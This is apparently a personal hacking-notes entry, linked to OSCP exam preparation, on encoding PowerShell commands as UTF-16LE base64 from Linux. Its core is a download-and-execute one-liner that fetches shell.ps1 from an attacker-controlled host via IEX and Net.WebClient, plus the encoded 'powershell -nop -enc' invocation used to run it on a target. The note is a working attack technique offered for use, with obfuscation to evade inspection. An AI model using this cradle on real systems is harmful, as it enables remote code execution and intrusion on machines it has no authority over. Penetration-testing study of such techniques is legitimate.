# powershell encode commands as base64 with windows wide char strings in linux
```bash
echo -n "IEX(New-Object Net.WebClient).downloadString('http://$ATTACKER/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
```

Target:
```
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```

` zet/20221003150729/README.md `

# Related

- [20221009005402](/zet/20221009005402/README.md) preparing for the OSCP exam
- [20221003150730](/zet/20221003150730/README.md) powershell
- ~/kb/hacking/commands/encode-powershell-base64-windows.md

Tags:

    #command #hacking #windows #encode 
